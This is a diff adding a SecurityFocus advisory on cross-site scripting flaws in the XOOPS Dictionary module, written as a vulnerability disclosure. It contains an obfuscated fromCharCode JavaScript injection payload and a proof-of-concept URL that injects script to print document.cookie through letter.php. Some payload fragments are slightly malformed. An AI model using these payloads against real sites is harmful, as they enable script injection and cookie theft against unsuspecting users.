@@ -1,0 +1,38 @@
+source: http://www.securityfocus.com/bid/11064/info
+
+Reportedly the XOOPS Dictionary Module by Nagle is affected by multiple cross-site scripting vulnerabilities. This issue is due to a failure of the application to properly sanitize user-supplied URI input.
+
+As a result of this issue and attacker can execute arbitrary script code in the browser of an unsuspecting user by enticing the unsuspecting user to follow a malicious link.
+
+An attacker can leverage this issue to steal cookie based authentication credentials as well as carry out other attacks. It should be noted that the impact of this issue depends on the context of the dynamic web site developed with the XOOPS software and the XOOPS dictionary module and so cannot accurately be outlined here. 
+
+script>
+function xss (){
+var tag=String.fromCharCode(60)+String.fromCharCode(105)+
+String.fromCharCode(109)+String.fromCharCode(103)+String.fromCharCode(32)+
+String.fromCharCode(115)+String.fromCharCode(114)+String.fromCharCode(99)+
+String.fromCharCode(32)+String.fromCharCode(61);
+var web=String.fromCharCode(104)+String.fromCharCode(116)+
+String.fromCharCode(116)+String.fromCharCode(112)+String.fromCharCode(58)+
+String.fromCharCode(47)+String.fromCharCode(47)+String.fromCharCode(119)+
+String.fromCharCode(119)+String.fromCharCode(119)+String.fromCharCode(46)+
+String.fromCharCode(103)+String.fromCharCode(111)+String.fromCharCode(111)+
+String.fromCharCode(103)+String.fromCharCode(108)+String.fromCharCode(101)+
+String.fromCharCode(46)+String.fromCharCode(99)+String.fromCharCode(111)+
+String.fromCharCode(109);
+var path=String.fromCharCode(47)+String.fromCharCode(105)+
+String.fromCharCode(109)+String.fromCharCode(97)+String.fromCharCode(103)+
+String.fromCharCode(101)+String.fromCharCode(115)+String.fromCharCode(47)+
+String.fromCharCode(103)+String.fromCharCode(111)+String.fromCharCode(111)+
+String.fromCharCode(103)+String.fromCharCode(108)+String.fromCharCode(101)+
+String.fromCharCode(95)+String.fromCharCode(56)+String.fromCharCode(48)+
+String.fromCharCode(119)+String.fromCharCode(104)+String.fromCharCode(116)+
+String.fromCharCode(46)+String.fromCharCode(103)+String.fromCharCode(105)+
+String.fromCharCode(102)+String.fromCharCode(62);
+document.write(tag+web+path);
+} xss()
+</script>
+
+The following proof of concept has been provided for the 'letter.php' script issue:
+
+ttp://attaker/modules/dictionary/letter.php?letter="><script>document.write(document.cookie)<script>( 
